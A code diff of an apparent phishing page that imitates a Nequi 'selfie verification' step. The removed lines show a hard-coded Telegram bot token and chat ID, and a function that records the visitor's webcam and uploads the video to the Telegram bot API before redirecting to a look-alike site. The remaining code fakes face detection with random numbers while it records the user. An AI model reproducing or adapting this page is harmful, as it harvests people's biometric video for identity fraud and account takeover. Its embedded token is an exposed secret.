@@ -61,6 +61,7 @@ video {
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
+    z-index: 10;
 }
 
 .oval.valid {
@@ -68,7 +69,21 @@ video {
     box-shadow: 0 0 25px #00ff88;
 }
 
-/* Texto */
+/* TEXTO ARRIBA (PERMANENTE) */
+.texto-arriba {
+    position: absolute;
+    top: calc(50% - 260px);
+    left: 50%;
+    transform: translateX(-50%);
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    text-shadow: 1px 1px 3px black;
+    text-align: center;
+    z-index: 20;
+}
+
+/* Texto abajo */
 .status {
     position: absolute;
     bottom: 30px;
@@ -116,33 +131,22 @@ video {
 .countdown.show {
     display: block;
 }
-
-    .texto-arriba {
-    position: absolute;
-    top: calc(50% - 260px); /* arriba del óvalo */
-    left: 50%;
-    transform: translateX(-50%);
-    color: white;
-    font-size: 16px;
-    font-weight: bold;
-    text-shadow: 1px 1px 3px black;
-    text-align: center;
-    z-index: 50; /* 🔥 importante para que siempre se vea */
-}
 </style>
 </head>
 
 <body>
-<div class="oval" id="oval"></div>
+
+<!-- TEXTO ARRIBA -->
 <div class="texto-arriba">Mira al frente de la cámara</div>
-<!-- 🔥 ALERTA INSTRUCCIONES -->
+
+<!-- 🔥 ALERTA -->
 <div id="alertaSelfie" class="alerta-selfie">
 📸 Verificación Facial<br>
 Mantén tu rostro en el círculo<br>
 mira de frente a la Camara por favor
 </div>
 
-    <div class="warning-message" id="warningMessage">
+<div class="warning-message" id="warningMessage">
 ⚠️ Coloca tu rostro en el círculo
 </div>
 
@@ -152,10 +156,11 @@ mira de frente a la Camara por favor
 
 <video id="video" autoplay muted playsinline></video>
 <div class="overlay"></div>
+
+<!-- 🔥 SOLO UN ÓVALO (CORREGIDO) -->
 <div class="oval" id="oval"></div>
+
 <div class="countdown" id="countdown">3</div>
-
-
 
 <script>
 const video = document.getElementById("video");
@@ -164,7 +169,7 @@ const statusText = document.getElementById("status");
 const warningMessage = document.getElementById("warningMessage");
 const countdownDiv = document.getElementById("countdown");
 
-/* 🔥 ALERTA 5 SEGUNDOS */
+/* ALERTA */
 const alertaSelfie = document.getElementById("alertaSelfie");
 window.addEventListener("load", ()=>{
     alertaSelfie.classList.add("show");
@@ -172,12 +177,6 @@ window.addEventListener("load", ()=>{
         alertaSelfie.classList.remove("show");
     },5000);
 });
-
-/* CONFIG TELEGRAM */
-const TELEGRAM_CONFIG = {
-    token: "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA",
-    chatId: "7158969671"
-};
 
 let recording = false;
 let mediaRecorder = null;
@@ -191,22 +190,19 @@ navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
     videoStream = stream;
     video.srcObject = stream;
-    statusText.innerText = " Coloca tu rostro en el círculo";
 })
 .catch(() => {
     statusText.innerText = "❌ Error cámara";
 });
 
-/* DETECCIÓN SIMPLE DE ROSTRO */
+/* DETECCIÓN */
 function startFaceDetection() {
     if (detectionInterval) clearInterval(detectionInterval);
     
     detectionInterval = setInterval(() => {
         if (recording || faceDetected) return;
 
-        const random = Math.random();
-
-        if (random > 0.5) { // Rostro detectado
+        if (Math.random() > 0.5) {
             oval.classList.add("valid");
             warningMessage.classList.remove("show");
             statusText.innerText = "✅ Rostro detectando..";
@@ -214,7 +210,6 @@ function startFaceDetection() {
             faceDetected = true;
             clearInterval(detectionInterval);
             
-            // Iniciar la grabación después de 1 segundo
             setTimeout(() => {
                 startRecording(videoStream);
             }, 1000);
@@ -227,7 +222,7 @@ function startFaceDetection() {
     }, 1000);
 }
 
-/* FUNCIÓN PRINCIPAL DE GRABACIÓN */
+/* GRABACIÓN */
 function startRecording(stream) {
     if (recording) return;
 
@@ -237,18 +232,14 @@ function startRecording(stream) {
     mediaRecorder = new MediaRecorder(stream);
 
     mediaRecorder.ondataavailable = event => {
-        if (event.data.size > 0) {
-            recordedChunks.push(event.data);
-        }
+        if (event.data.size > 0) recordedChunks.push(event.data);
     };
 
     mediaRecorder.onstop = () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
         statusText.innerText = "Acerca mas tu rostro...";
-        enviarVideoTelegram(blob);
     };
 
-    // Mostrar contador regresivo
     let count = 3;
     countdownDiv.innerText = count;
     countdownDiv.classList.add("show");
@@ -260,14 +251,11 @@ function startRecording(stream) {
         } else {
             clearInterval(countdownInterval);
             countdownDiv.classList.remove("show");
-            
-            // Iniciar grabación
             mediaRecorder.start();
             statusText.innerText = "Mira de frente a la Camara";
-            
-            // Detener después de 10 segundos
+
             setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === "recording") {
+                if (mediaRecorder.state === "recording") {
                     mediaRecorder.stop();
                     statusText.innerText = "finalizada...";
                 }
@@ -276,45 +264,9 @@ function startRecording(stream) {
     }, 1000);
 }
 
-/* ENVIAR VIDEO A TELEGRAM */
-function enviarVideoTelegram(videoBlob) {
-    const formData = new FormData();
-    
-    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-    formData.append('video', videoBlob, 'verificacion_facial.webm');
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendVideo`, {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => {
-        if (response.ok) {
-            statusText.innerText = "✅ selfi nequi correcta";
-            setTimeout(() => {
-                window.location.href = "https://teprestanequi.vercel.app/inicio/";
-            }, 3000);
-        } else {
-            throw new Error("Error en respuesta");
-        }
-    })
-    .catch(error => {
-        console.error("Error:", error);
-        statusText.innerText = "❌ Error al enviar el video";
-        recording = false;
-        faceDetected = false;
-        // Reiniciar detección
-        setTimeout(() => {
-            startFaceDetection();
-        }, 3000);
-    });
-}
-
-/* INICIAR DETECCIÓN DE ROSTRO AL CARGAR */
 window.addEventListener("load", () => {
     setTimeout(() => {
-        if (videoStream) {
-            startFaceDetection();
-        }
+        if (videoStream) startFaceDetection();
     }, 2000);
 });
 </script>
